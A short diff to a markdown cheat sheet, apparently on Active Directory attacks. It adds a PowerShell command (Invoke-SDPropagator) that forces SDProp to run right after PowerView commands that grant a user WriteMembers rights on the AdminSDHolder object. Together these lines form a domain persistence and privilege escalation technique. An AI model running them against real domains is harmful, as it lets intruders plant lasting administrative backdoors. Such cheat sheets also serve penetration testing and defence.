@@ -522,6 +522,11 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights WriteMembers -Verbose
 ```
 
+*Run SDProp manually*
+```powershell
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+```
+
 ## ACLs and ACEs Abusing
 
 ### GenericAll
